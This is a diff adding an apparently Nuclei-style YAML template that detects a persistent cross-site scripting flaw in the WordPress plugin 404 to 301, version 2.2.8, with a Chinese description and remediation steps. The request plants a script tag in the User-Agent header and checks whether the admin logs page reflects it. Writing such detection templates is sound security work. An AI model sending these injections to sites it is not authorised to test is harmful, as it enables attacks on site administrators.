@@ -1,0 +1,28 @@
+id: Wordpress-Plugin_404-XSS
+info:
+  name: WordPress Plugin 404 to 301 2.2.8 - Persistent Cross-Site Scripting
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin 404-to-301 跨站脚本漏洞
+    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。404-to-301是使用在其中的一个用于将404页面重定向到其它页面的插件。
+
+    WordPress 404-to-301插件2.2.8 版本中存在跨站脚本漏洞。该漏洞源于没有验证用户提供的输入。攻击者利用该漏洞在受影响站点上下文中未指定用户浏览器中执行任意脚本代码，可窃取基于cookie认证证书进而发起其他攻击。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/404-to-301/#developers
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"<script>alert(/hi/)</script>")
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-admin/admin.php?page=i4t3-logs'
+  method: GET
+  headers:
+    User-Agent: <script>alert(/hi/)</script>
